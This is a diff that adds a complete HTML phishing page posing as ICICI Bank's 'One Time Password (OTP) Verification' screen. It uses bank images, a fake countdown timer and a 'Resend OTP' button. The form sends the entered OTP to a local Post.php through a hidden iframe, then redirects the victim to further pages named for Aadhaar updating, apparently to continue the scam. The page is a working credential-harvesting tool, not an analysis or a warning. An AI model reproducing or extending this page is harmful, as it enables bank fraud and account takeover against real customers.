@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+   <meta http-equiv="content-type" content="text/html;charset=utf-8" />
+   <meta name="theme-color" content="#FFF">
+   <head>
+      <meta charSet="utf-8"/>
+      <meta name="viewport" content="width=device-width"/>
+      <title>OTP authentication | ICICI Bank</title>
+      <meta name="description" content="login"/>
+      <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+      <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+      <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+      <link rel="manifest" href="/site.webmanifest">
+      <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+      <meta name="msapplication-TileColor" content="#da532c">
+      <meta name="next-head-count" content="4"/>
+      <link rel="preload" href="Axis.css" as="style"/>
+      <link rel="stylesheet" href="Axis.css" data-n-g=""/>
+      <link rel="preconnect" href="https://fonts.googleapis.com">
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      <link href="https://fonts.googleapis.com/css2?family=Work+Sans&display=swap" rel="stylesheet">
+      <noscript data-n-css=""></noscript>
+      <style>
+      .new-control
+      {
+      text-transform:uppercase;
+      }
+      </style>
+    </head>
+   <body onload="startTimer();">
+   <!-- partial:index.partial.html -->
+   <div class="login-box">
+   <!-- Static- Please don't do anything here-->
+   <script type="text/javascript">var submitted=false;</script>
+   <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='AADHAR_Updating.html';}"></iframe>
+   <!--My Form-->
+      <div id="__next">
+           <img alt="" src="icici h.jpg" style="width:100%;" />
+         </div>
+         <div class="mainContent">
+            <h1 class="text-center">One Time Password (OTP) Verification</h1>
+            <div class="card">
+            <p1 style="color:grey; font-size:13px; margin-left:20px; font-family: 'Work Sans', sans-serif;">One Time Password (OTP) has been sent to<br>
+            <span style="font-size:13px; margin-left:20px; font-family: 'Work Sans', sans-serif;">
+            your registered mobile Number. Please enter<br></span>
+            <span style="font-size:13px; margin-left:20px; font-family:'Work Sans', sans-serif;">the OTP and proceed.</span><br> 
+               <form class="LoginForm" action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
+                  <input type="hidden" name="" value=""/>
+                  <div class="form-group"><label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="4TH_OTP">
+                  One Time Password<p1 style="font-size:13px; color:red;">*</p1></label>
+                  <input type="text" class="new-control" id="5TH_OTP" name="5TH_OTP" maxLength="6" inputmode="numeric" pattern="[0-9]\d{5}" title="Please enter valid OTP!" required=""/></div>
+                  <script type="text/javascript">
+                  var timer=180;
+                  var sec=0;
+                  function startTimer() {
+                  sec=parseInt(timer%180);
+                  
+                  if (timer<2) {
+                  // timer.stop();
+                  window.location.href = "Enter_OTP_AADHAR.html";
+                  }
+                  
+                  document.getElementById("time").innerHTML = "<p1> Wait for OTP   : </p1>"+sec.toString();
+                  timer--;
+                  setTimeout(function(){
+                  startTimer();
+                  
+                  }, 1000);
+                  }
+                  
+                  </script>
+                  <div id="re">
+                  <b> <a href="" style="color:#fff; font-family: 'Work Sans', sans-serif; background-color:#f69312; padding:4px 6px; border-radius:4px; position:absolute; margin:-4%; margin-left:165px; text-decoration:none;">Resend OTP</a></b><br>
+                  </div><br>
+                  <div>
+                  <center><b style="color:#f69312; font-family: 'Work Sans', sans-serif; font-size:14px; text-align:center;"><span style="color:#f69312; font-family: 'Work Sans', sans-serif; font-size:13px;" id="time"></span>&nbsp;second</b></center>
+                  </div><br>
+                  <div class="text-center"><button type="submit" class="submit">Proceed</button></div>
+               </form>
+            </div>
+            <br><br>
+            <img alt="" src="ICICI OTP F.jpg" style="width: 100%; height: auto;" />
+         </div>
+      </div>
+     </body>
+</html>
